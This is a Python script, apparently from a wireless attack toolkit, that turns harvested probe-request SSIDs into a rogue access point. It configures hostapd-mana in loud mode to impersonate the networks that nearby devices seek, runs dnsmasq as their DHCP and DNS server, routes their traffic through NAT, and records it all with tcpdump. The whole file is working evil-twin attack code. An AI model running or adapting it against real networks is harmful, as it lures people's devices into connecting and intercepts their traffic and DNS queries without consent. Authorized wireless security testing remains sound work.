"""SSID-pool runner — hostapd-mana with a pool file of harvested SSIDs."""

from __future__ import annotations

import argparse
import signal
import subprocess
import sys
import time
from pathlib import Path

from wifipi.probes import parse_airodump_csv


def extract_unique_ssids(csv_path: Path, limit: int) -> list[str]:
    records = parse_airodump_csv(csv_path)
    seen: list[str] = []
    for rec in records:
        for ssid in rec.probed_ssids:
            if ssid and ssid not in seen:
                seen.append(ssid)
                if len(seen) >= limit:
                    return seen
    return seen


def hostapd_mana_conf(iface: str, channel: int, pool_file: Path,
                      karma_out: Path) -> str:
    return (
        f"interface={iface}\n"
        "driver=nl80211\n"
        "ssid=FreeWiFi\n"
        "hw_mode=g\n"
        f"channel={channel}\n"
        "ieee80211n=1\n"
        "auth_algs=1\n"
        "wmm_enabled=1\n"
        "enable_karma=0\n"
        f"mana_loud=1\n"
        f"mana_ssid_filter_file={pool_file}\n"
        f"mana_wpaout={karma_out}\n"
    )


def dnsmasq_conf(iface: str, log_path: Path) -> str:
    return (
        f"interface={iface}\n"
        "bind-interfaces\n"
        "dhcp-range=10.0.0.10,10.0.0.100,12h\n"
        "dhcp-option=3,10.0.0.1\n"
        "dhcp-option=6,10.0.0.1\n"
        "log-queries\n"
        f"log-facility={log_path}\n"
    )


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("--workdir", required=True)
    p.add_argument("--ap-iface", required=True)
    p.add_argument("--probes-csv", required=True)
    p.add_argument("--channel", type=int, default=6)
    p.add_argument("--upstream", default="eth0")
    p.add_argument("--max-ssids", type=int, default=50)
    args = p.parse_args()

    workdir = Path(args.workdir)
    workdir.mkdir(parents=True, exist_ok=True)
    hostapd_path = workdir / "hostapd-mana.conf"
    dnsmasq_path = workdir / "dnsmasq.conf"
    hostapd_log = workdir / "hostapd-mana.log"
    dnsmasq_log = workdir / "dnsmasq.log"
    pool_file = workdir / "ssidlist.txt"
    karma_out = workdir / "associations.log"
    pcap = workdir / "ssidpool.pcap"

    csv_path = Path(args.probes_csv)
    if not csv_path.is_file():
        print(f"[x] probes CSV not found: {csv_path}", flush=True)
        return 2
    ssids = extract_unique_ssids(csv_path, args.max_ssids)
    if not ssids:
        print("[x] no SSIDs extracted from probes CSV", flush=True)
        return 2
    pool_file.write_text("\n".join(ssids) + "\n")
    print(f"[*] SSID pool size: {len(ssids)}", flush=True)

    hostapd_path.write_text(hostapd_mana_conf(
        args.ap_iface, args.channel, pool_file, karma_out))
    dnsmasq_path.write_text(dnsmasq_conf(args.ap_iface, dnsmasq_log))

    subprocess.run(["nmcli", "device", "set", args.ap_iface, "managed", "no"], check=False)
    subprocess.run(["ip", "addr", "flush", "dev", args.ap_iface], check=False)
    subprocess.run(["ip", "addr", "add", "10.0.0.1/24", "dev", args.ap_iface], check=False)
    subprocess.run(["ip", "link", "set", args.ap_iface, "up"], check=False)

    nat_ok = Path(f"/sys/class/net/{args.upstream}").exists()
    if nat_ok:
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"],
                       stdout=subprocess.DEVNULL, check=False)
        subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING",
                        "-o", args.upstream, "-j", "MASQUERADE"], check=False)
        subprocess.run(["iptables", "-A", "FORWARD", "-i", args.ap_iface,
                        "-o", args.upstream, "-j", "ACCEPT"], check=False)
        subprocess.run(["iptables", "-A", "FORWARD", "-i", args.upstream, "-o", args.ap_iface,
                        "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"],
                       check=False)

    hostapd_fh = open(hostapd_log, "ab")
    dnsmasq_fh = open(dnsmasq_log, "ab")
    hostapd = subprocess.Popen(["hostapd-mana", str(hostapd_path)],
                               stdout=hostapd_fh, stderr=hostapd_fh)
    dnsmasq = subprocess.Popen(["dnsmasq", "--no-daemon", "-C", str(dnsmasq_path)],
                               stdout=dnsmasq_fh, stderr=dnsmasq_fh)
    tcpdump = subprocess.Popen(
        ["tcpdump", "-i", args.ap_iface, "-n", "-s0", "-w", str(pcap)],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )

    running = {"go": True}

    def stop(_sig, _frm):
        running["go"] = False

    signal.signal(signal.SIGTERM, stop)
    signal.signal(signal.SIGINT, stop)

    print(f"[*] ssid-pool up on {args.ap_iface} ch={args.channel} "
          f"({len(ssids)} SSIDs)", flush=True)

    try:
        while running["go"]:
            if hostapd.poll() is not None:
                print("[x] hostapd-mana died", flush=True)
                break
            time.sleep(1)
    finally:
        for proc in (hostapd, dnsmasq, tcpdump):
            try:
                proc.terminate()
            except Exception:
                pass
        for proc in (hostapd, dnsmasq, tcpdump):
            try:
                proc.wait(timeout=3)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        hostapd_fh.close()
        dnsmasq_fh.close()
        if nat_ok:
            subprocess.run(["iptables", "-t", "nat", "-D", "POSTROUTING",
                            "-o", args.upstream, "-j", "MASQUERADE"], check=False)
            subprocess.run(["iptables", "-D", "FORWARD", "-i", args.ap_iface,
                            "-o", args.upstream, "-j", "ACCEPT"], check=False)
            subprocess.run(["iptables", "-D", "FORWARD", "-i", args.upstream, "-o", args.ap_iface,
                            "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"],
                           check=False)
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"],
                           stdout=subprocess.DEVNULL, check=False)
        subprocess.run(["ip", "addr", "flush", "dev", args.ap_iface], check=False)
    return 0


if __name__ == "__main__":
    sys.exit(main())
